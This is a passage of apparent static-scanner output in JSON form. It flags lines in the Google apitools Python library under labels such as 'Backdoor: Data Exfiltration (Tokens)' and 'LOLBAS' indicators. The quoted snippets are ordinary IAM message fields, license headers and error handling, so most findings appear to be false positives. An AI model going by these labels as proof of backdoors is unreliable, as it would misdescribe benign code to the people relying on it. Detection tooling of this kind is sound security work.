                      "markdown": "`\n  name = _messages.StringField(1)\n  privateKeyData = _messages.BytesField(2)\n  privateKeyType = _messages.EnumField('PrivateKeyTypeValueValuesEnum', 3)\n  publicKeyData = _messages.BytesField(4)\n  validAfterTime = _messages.StringField(5)\n  validBeforeTime = _messages.StringField(6)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1/iam_v1_messages.py"
                },
                "region": {
                  "startLine": 806,
                  "startColumn": 2,
                  "endLine": 806,
                  "endColumn": 12,
                  "snippet": {
                    "text": "\n  name = _messages.StringField(1)\n  privateKeyData = _messages.BytesField(2)\n  privateKeyType = _messages.EnumField('PrivateKeyTypeValueValuesEnum', 3)\n  publicKeyData = _messages.BytesField(4)\n  validAfterTime = _messages.StringField(5)\n  validBeforeTime = _messages.StringField(6)\n",
                    "rendered": {
                      "text": "\n  name = _messages.StringField(1)\n  privateKeyData = _messages.BytesField(2)\n  privateKeyType = _messages.EnumField('PrivateKeyTypeValueValuesEnum', 3)\n  publicKeyData = _messages.BytesField(4)\n  validAfterTime = _messages.StringField(5)\n  validBeforeTime = _messages.StringField(6)\n",
                      "markdown": "`\n  name = _messages.StringField(1)\n  privateKeyData = _messages.BytesField(2)\n  privateKeyType = _messages.EnumField('PrivateKeyTypeValueValuesEnum', 3)\n  publicKeyData = _messages.BytesField(4)\n  validAfterTime = _messages.StringField(5)\n  validBeforeTime = _messages.StringField(6)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1/iam_v1_messages.py"
                },
                "region": {
                  "startLine": 805,
                  "startColumn": 2,
                  "endLine": 805,
                  "endColumn": 12,
                  "snippet": {
                    "text": "    TYPE_GOOGLE_CREDENTIALS_FILE = 2\n\n  name = _messages.StringField(1)\n  privateKeyData = _messages.BytesField(2)\n  privateKeyType = _messages.EnumField('PrivateKeyTypeValueValuesEnum', 3)\n  publicKeyData = _messages.BytesField(4)\n  validAfterTime = _messages.StringField(5)\n",
                    "rendered": {
                      "text": "    TYPE_GOOGLE_CREDENTIALS_FILE = 2\n\n  name = _messages.StringField(1)\n  privateKeyData = _messages.BytesField(2)\n  privateKeyType = _messages.EnumField('PrivateKeyTypeValueValuesEnum', 3)\n  publicKeyData = _messages.BytesField(4)\n  validAfterTime = _messages.StringField(5)\n",
                      "markdown": "`    TYPE_GOOGLE_CREDENTIALS_FILE = 2\n\n  name = _messages.StringField(1)\n  privateKeyData = _messages.BytesField(2)\n  privateKeyType = _messages.EnumField('PrivateKeyTypeValueValuesEnum', 3)\n  publicKeyData = _messages.BytesField(4)\n  validAfterTime = _messages.StringField(5)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1/iam_v1_messages.py"
                },
                "region": {
                  "startLine": 795,
                  "startColumn": 43,
                  "endLine": 795,
                  "endColumn": 51,
                  "snippet": {
                    "text": "    Values:\n      TYPE_UNSPECIFIED: Unspecified. Equivalent to\n        `TYPE_GOOGLE_CREDENTIALS_FILE`.\n      TYPE_PKCS12_FILE: PKCS12 format. The password for the PKCS12 file is\n        `notasecret`. For more information, see\n        https://tools.ietf.org/html/rfc7292.\n      TYPE_GOOGLE_CREDENTIALS_FILE: Google Credentials File format.\n",
                    "rendered": {
                      "text": "    Values:\n      TYPE_UNSPECIFIED: Unspecified. Equivalent to\n        `TYPE_GOOGLE_CREDENTIALS_FILE`.\n      TYPE_PKCS12_FILE: PKCS12 format. The password for the PKCS12 file is\n        `notasecret`. For more information, see\n        https://tools.ietf.org/html/rfc7292.\n      TYPE_GOOGLE_CREDENTIALS_FILE: Google Credentials File format.\n",
                      "markdown": "`    Values:\n      TYPE_UNSPECIFIED: Unspecified. Equivalent to\n        `TYPE_GOOGLE_CREDENTIALS_FILE`.\n      TYPE_PKCS12_FILE: PKCS12 format. The password for the PKCS12 file is\n        `notasecret`. For more information, see\n        https://tools.ietf.org/html/rfc7292.\n      TYPE_GOOGLE_CREDENTIALS_FILE: Google Credentials File format.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1/iam_v1_messages.py"
                },
                "region": {
                  "startLine": 786,
                  "startColumn": 8,
                  "endLine": 786,
                  "endColumn": 18,
                  "snippet": {
                    "text": "    validBeforeTime: The key can be used before this timestamp.\n  \"\"\"\n\n  class PrivateKeyTypeValueValuesEnum(_messages.Enum):\n    r\"\"\"The output format for the private key. Only provided in\n    `CreateServiceAccountKey` responses, not in `GetServiceAccountKey` or\n    `ListServiceAccountKey` responses.  Google never exposes system-managed\n",
                    "rendered": {
                      "text": "    validBeforeTime: The key can be used before this timestamp.\n  \"\"\"\n\n  class PrivateKeyTypeValueValuesEnum(_messages.Enum):\n    r\"\"\"The output format for the private key. Only provided in\n    `CreateServiceAccountKey` responses, not in `GetServiceAccountKey` or\n    `ListServiceAccountKey` responses.  Google never exposes system-managed\n",
                      "markdown": "`    validBeforeTime: The key can be used before this timestamp.\n  \"\"\"\n\n  class PrivateKeyTypeValueValuesEnum(_messages.Enum):\n    r\"\"\"The output format for the private key. Only provided in\n    `CreateServiceAccountKey` responses, not in `GetServiceAccountKey` or\n    `ListServiceAccountKey` responses.  Google never exposes system-managed\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1/iam_v1_messages.py"
                },
                "region": {
                  "startLine": 776,
                  "startColumn": 4,
                  "endLine": 776,
                  "endColumn": 14,
                  "snippet": {
                    "text": "      `projects/{project}/serviceAccounts/{account}/keys/{key}`.\n    privateKeyData: The private key data. Only provided in\n      `CreateServiceAccountKey` responses.\n    privateKeyType: The output format for the private key. Only provided in\n      `CreateServiceAccountKey` responses, not in `GetServiceAccountKey` or\n      `ListServiceAccountKey` responses.  Google never exposes system-managed\n      private keys, and never retains user-managed private keys.\n",
                    "rendered": {
                      "text": "      `projects/{project}/serviceAccounts/{account}/keys/{key}`.\n    privateKeyData: The private key data. Only provided in\n      `CreateServiceAccountKey` responses.\n    privateKeyType: The output format for the private key. Only provided in\n      `CreateServiceAccountKey` responses, not in `GetServiceAccountKey` or\n      `ListServiceAccountKey` responses.  Google never exposes system-managed\n      private keys, and never retains user-managed private keys.\n",
                      "markdown": "`      `projects/{project}/serviceAccounts/{account}/keys/{key}`.\n    privateKeyData: The private key data. Only provided in\n      `CreateServiceAccountKey` responses.\n    privateKeyType: The output format for the private key. Only provided in\n      `CreateServiceAccountKey` responses, not in `GetServiceAccountKey` or\n      `ListServiceAccountKey` responses.  Google never exposes system-managed\n      private keys, and never retains user-managed private keys.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1/iam_v1_messages.py"
                },
                "region": {
                  "startLine": 774,
                  "startColumn": 4,
                  "endLine": 774,
                  "endColumn": 14,
                  "snippet": {
                    "text": "  Fields:\n    name: The resource name of the service account key in the following format\n      `projects/{project}/serviceAccounts/{account}/keys/{key}`.\n    privateKeyData: The private key data. Only provided in\n      `CreateServiceAccountKey` responses.\n    privateKeyType: The output format for the private key. Only provided in\n      `CreateServiceAccountKey` responses, not in `GetServiceAccountKey` or\n",
                    "rendered": {
                      "text": "  Fields:\n    name: The resource name of the service account key in the following format\n      `projects/{project}/serviceAccounts/{account}/keys/{key}`.\n    privateKeyData: The private key data. Only provided in\n      `CreateServiceAccountKey` responses.\n    privateKeyType: The output format for the private key. Only provided in\n      `CreateServiceAccountKey` responses, not in `GetServiceAccountKey` or\n",
                      "markdown": "`  Fields:\n    name: The resource name of the service account key in the following format\n      `projects/{project}/serviceAccounts/{account}/keys/{key}`.\n    privateKeyData: The private key data. Only provided in\n      `CreateServiceAccountKey` responses.\n    privateKeyType: The output format for the private key. Only provided in\n      `CreateServiceAccountKey` responses, not in `GetServiceAccountKey` or\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1/iam_v1_messages.py"
                },
                "region": {
                  "startLine": 765,
                  "startColumn": 4,
                  "endLine": 765,
                  "endColumn": 14,
                  "snippet": {
                    "text": "  published at the OAuth2 Service Account API.\n\n  Enums:\n    PrivateKeyTypeValueValuesEnum: The output format for the private key. Only\n      provided in `CreateServiceAccountKey` responses, not in\n      `GetServiceAccountKey` or `ListServiceAccountKey` responses.  Google\n      never exposes system-managed private keys, and never retains user-\n",
                    "rendered": {
                      "text": "  published at the OAuth2 Service Account API.\n\n  Enums:\n    PrivateKeyTypeValueValuesEnum: The output format for the private key. Only\n      provided in `CreateServiceAccountKey` responses, not in\n      `GetServiceAccountKey` or `ListServiceAccountKey` responses.  Google\n      never exposes system-managed private keys, and never retains user-\n",
                      "markdown": "`  published at the OAuth2 Service Account API.\n\n  Enums:\n    PrivateKeyTypeValueValuesEnum: The output format for the private key. Only\n      provided in `CreateServiceAccountKey` responses, not in\n      `GetServiceAccountKey` or `ListServiceAccountKey` responses.  Google\n      never exposes system-managed private keys, and never retains user-\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1/iam_v1_messages.py"
                },
                "region": {
                  "startLine": 179,
                  "startColumn": 40,
                  "endLine": 179,
                  "endColumn": 50,
                  "snippet": {
                    "text": "    TYPE_PKCS12_FILE = 1\n    TYPE_GOOGLE_CREDENTIALS_FILE = 2\n\n  privateKeyType = _messages.EnumField('PrivateKeyTypeValueValuesEnum', 1)\n\n\nclass CreateServiceAccountRequest(_messages.Message):\n",
                    "rendered": {
                      "text": "    TYPE_PKCS12_FILE = 1\n    TYPE_GOOGLE_CREDENTIALS_FILE = 2\n\n  privateKeyType = _messages.EnumField('PrivateKeyTypeValueValuesEnum', 1)\n\n\nclass CreateServiceAccountRequest(_messages.Message):\n",
                      "markdown": "`    TYPE_PKCS12_FILE = 1\n    TYPE_GOOGLE_CREDENTIALS_FILE = 2\n\n  privateKeyType = _messages.EnumField('PrivateKeyTypeValueValuesEnum', 1)\n\n\nclass CreateServiceAccountRequest(_messages.Message):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1/iam_v1_messages.py"
                },
                "region": {
                  "startLine": 179,
                  "startColumn": 2,
                  "endLine": 179,
                  "endColumn": 12,
                  "snippet": {
                    "text": "    TYPE_PKCS12_FILE = 1\n    TYPE_GOOGLE_CREDENTIALS_FILE = 2\n\n  privateKeyType = _messages.EnumField('PrivateKeyTypeValueValuesEnum', 1)\n\n\nclass CreateServiceAccountRequest(_messages.Message):\n",
                    "rendered": {
                      "text": "    TYPE_PKCS12_FILE = 1\n    TYPE_GOOGLE_CREDENTIALS_FILE = 2\n\n  privateKeyType = _messages.EnumField('PrivateKeyTypeValueValuesEnum', 1)\n\n\nclass CreateServiceAccountRequest(_messages.Message):\n",
                      "markdown": "`    TYPE_PKCS12_FILE = 1\n    TYPE_GOOGLE_CREDENTIALS_FILE = 2\n\n  privateKeyType = _messages.EnumField('PrivateKeyTypeValueValuesEnum', 1)\n\n\nclass CreateServiceAccountRequest(_messages.Message):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1/iam_v1_messages.py"
                },
                "region": {
                  "startLine": 170,
                  "startColumn": 43,
                  "endLine": 170,
                  "endColumn": 51,
                  "snippet": {
                    "text": "    Values:\n      TYPE_UNSPECIFIED: Unspecified. Equivalent to\n        `TYPE_GOOGLE_CREDENTIALS_FILE`.\n      TYPE_PKCS12_FILE: PKCS12 format. The password for the PKCS12 file is\n        `notasecret`. For more information, see\n        https://tools.ietf.org/html/rfc7292.\n      TYPE_GOOGLE_CREDENTIALS_FILE: Google Credentials File format.\n",
                    "rendered": {
                      "text": "    Values:\n      TYPE_UNSPECIFIED: Unspecified. Equivalent to\n        `TYPE_GOOGLE_CREDENTIALS_FILE`.\n      TYPE_PKCS12_FILE: PKCS12 format. The password for the PKCS12 file is\n        `notasecret`. For more information, see\n        https://tools.ietf.org/html/rfc7292.\n      TYPE_GOOGLE_CREDENTIALS_FILE: Google Credentials File format.\n",
                      "markdown": "`    Values:\n      TYPE_UNSPECIFIED: Unspecified. Equivalent to\n        `TYPE_GOOGLE_CREDENTIALS_FILE`.\n      TYPE_PKCS12_FILE: PKCS12 format. The password for the PKCS12 file is\n        `notasecret`. For more information, see\n        https://tools.ietf.org/html/rfc7292.\n      TYPE_GOOGLE_CREDENTIALS_FILE: Google Credentials File format.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1/iam_v1_messages.py"
                },
                "region": {
                  "startLine": 163,
                  "startColumn": 8,
                  "endLine": 163,
                  "endColumn": 18,
                  "snippet": {
                    "text": "      `GOOGLE_CREDENTIALS_FILE` is the default output format.\n  \"\"\"\n\n  class PrivateKeyTypeValueValuesEnum(_messages.Enum):\n    r\"\"\"The output format of the private key. `GOOGLE_CREDENTIALS_FILE` is the\n    default output format.\n\n",
                    "rendered": {
                      "text": "      `GOOGLE_CREDENTIALS_FILE` is the default output format.\n  \"\"\"\n\n  class PrivateKeyTypeValueValuesEnum(_messages.Enum):\n    r\"\"\"The output format of the private key. `GOOGLE_CREDENTIALS_FILE` is the\n    default output format.\n\n",
                      "markdown": "`      `GOOGLE_CREDENTIALS_FILE` is the default output format.\n  \"\"\"\n\n  class PrivateKeyTypeValueValuesEnum(_messages.Enum):\n    r\"\"\"The output format of the private key. `GOOGLE_CREDENTIALS_FILE` is the\n    default output format.\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1/iam_v1_messages.py"
                },
                "region": {
                  "startLine": 159,
                  "startColumn": 4,
                  "endLine": 159,
                  "endColumn": 14,
                  "snippet": {
                    "text": "      `GOOGLE_CREDENTIALS_FILE` is the default output format.\n\n  Fields:\n    privateKeyType: The output format of the private key.\n      `GOOGLE_CREDENTIALS_FILE` is the default output format.\n  \"\"\"\n\n",
                    "rendered": {
                      "text": "      `GOOGLE_CREDENTIALS_FILE` is the default output format.\n\n  Fields:\n    privateKeyType: The output format of the private key.\n      `GOOGLE_CREDENTIALS_FILE` is the default output format.\n  \"\"\"\n\n",
                      "markdown": "`      `GOOGLE_CREDENTIALS_FILE` is the default output format.\n\n  Fields:\n    privateKeyType: The output format of the private key.\n      `GOOGLE_CREDENTIALS_FILE` is the default output format.\n  \"\"\"\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1/iam_v1_messages.py"
                },
                "region": {
                  "startLine": 155,
                  "startColumn": 4,
                  "endLine": 155,
                  "endColumn": 14,
                  "snippet": {
                    "text": "  r\"\"\"The service account key create request.\n\n  Enums:\n    PrivateKeyTypeValueValuesEnum: The output format of the private key.\n      `GOOGLE_CREDENTIALS_FILE` is the default output format.\n\n  Fields:\n",
                    "rendered": {
                      "text": "  r\"\"\"The service account key create request.\n\n  Enums:\n    PrivateKeyTypeValueValuesEnum: The output format of the private key.\n      `GOOGLE_CREDENTIALS_FILE` is the default output format.\n\n  Fields:\n",
                      "markdown": "`  r\"\"\"The service account key create request.\n\n  Enums:\n    PrivateKeyTypeValueValuesEnum: The output format of the private key.\n      `GOOGLE_CREDENTIALS_FILE` is the default output format.\n\n  Fields:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/exceptions.py"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 38,
                  "endLine": 8,
                  "snippet": {
                    "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                    "rendered": {
                      "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                      "markdown": "`#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/exceptions.py"
                },
                "region": {
                  "startLine": 84,
                  "startColumn": 36,
                  "endLine": 84,
                  "endColumn": 41,
                  "snippet": {
                    "text": "    def FromResponse(cls, http_response, **kwargs):\n        try:\n            status_code = int(http_response.info.get('status'))\n            error_cls = _HTTP_ERRORS.get(status_code, cls)\n        except ValueError:\n            error_cls = cls\n        return error_cls(http_response.info, http_response.content,\n",
                    "rendered": {
                      "text": "    def FromResponse(cls, http_response, **kwargs):\n        try:\n            status_code = int(http_response.info.get('status'))\n            error_cls = _HTTP_ERRORS.get(status_code, cls)\n        except ValueError:\n            error_cls = cls\n        return error_cls(http_response.info, http_response.content,\n",
                      "markdown": "`    def FromResponse(cls, http_response, **kwargs):\n        try:\n            status_code = int(http_response.info.get('status'))\n            error_cls = _HTTP_ERRORS.get(status_code, cls)\n        except ValueError:\n            error_cls = cls\n        return error_cls(http_response.info, http_response.content,\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/exceptions.py"
                },
                "region": {
                  "startLine": 83,
                  "startColumn": 48,
                  "endLine": 83,
                  "endColumn": 53,
                  "snippet": {
                    "text": "    @classmethod\n    def FromResponse(cls, http_response, **kwargs):\n        try:\n            status_code = int(http_response.info.get('status'))\n            error_cls = _HTTP_ERRORS.get(status_code, cls)\n        except ValueError:\n            error_cls = cls\n",
                    "rendered": {
                      "text": "    @classmethod\n    def FromResponse(cls, http_response, **kwargs):\n        try:\n            status_code = int(http_response.info.get('status'))\n            error_cls = _HTTP_ERRORS.get(status_code, cls)\n        except ValueError:\n            error_cls = cls\n",
                      "markdown": "`    @classmethod\n    def FromResponse(cls, http_response, **kwargs):\n        try:\n            status_code = int(http_response.info.get('status'))\n            error_cls = _HTTP_ERRORS.get(status_code, cls)\n        except ValueError:\n            error_cls = cls\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/stream_slice.py"
                },
                "region": {
                  "startLine": 49,
                  "startColumn": 15,
                  "endLine": 49,
                  "endColumn": 19,
                  "snippet": {
                    "text": "        return self.__max_bytes\n\n    def read(self, size=None):  # pylint: disable=missing-docstring\n        \"\"\"Read at most size bytes from this slice.\n\n        Compared to other streams, there is one case where we may\n        unexpectedly raise an exception on read: if the underlying stream\n",
                    "rendered": {
                      "text": "        return self.__max_bytes\n\n    def read(self, size=None):  # pylint: disable=missing-docstring\n        \"\"\"Read at most size bytes from this slice.\n\n        Compared to other streams, there is one case where we may\n        unexpectedly raise an exception on read: if the underlying stream\n",
                      "markdown": "`        return self.__max_bytes\n\n    def read(self, size=None):  # pylint: disable=missing-docstring\n        \"\"\"Read at most size bytes from this slice.\n\n        Compared to other streams, there is one case where we may\n        unexpectedly raise an exception on read: if the underlying stream\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/stream_slice.py"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 38,
                  "endLine": 8,
                  "snippet": {
                    "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                    "rendered": {
                      "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                      "markdown": "`#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/batch.py"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 38,
                  "endLine": 8,
                  "snippet": {
                    "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                    "rendered": {
                      "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                      "markdown": "`#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/batch.py"
                },
                "region": {
                  "startLine": 93,
                  "startColumn": 28,
                  "endLine": 94,
                  "snippet": {
                    "text": "            self.__retryable_codes = list(\n                set(retryable_codes + [http_client.UNAUTHORIZED]))\n            self.__http_response = None\n            self.__service = service\n            self.__method_config = method_config\n\n            self.http_request = request\n            # TODO(user): Add some validation to these fields.\n",
                    "rendered": {
                      "text": "            self.__retryable_codes = list(\n                set(retryable_codes + [http_client.UNAUTHORIZED]))\n            self.__http_response = None\n            self.__service = service\n            self.__method_config = method_config\n\n            self.http_request = request\n            # TODO(user): Add some validation to these fields.\n",
                      "markdown": "`            self.__retryable_codes = list(\n                set(retryable_codes + [http_client.UNAUTHORIZED]))\n            self.__http_response = None\n            self.__service = service\n            self.__method_config = method_config\n\n            self.http_request = request\n            # TODO(user): Add some validation to these fields.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/batch.py"
                },
                "region": {
                  "startLine": 86,
                  "startColumn": 24,
                  "endLine": 86,
                  "endColumn": 33,
                  "snippet": {
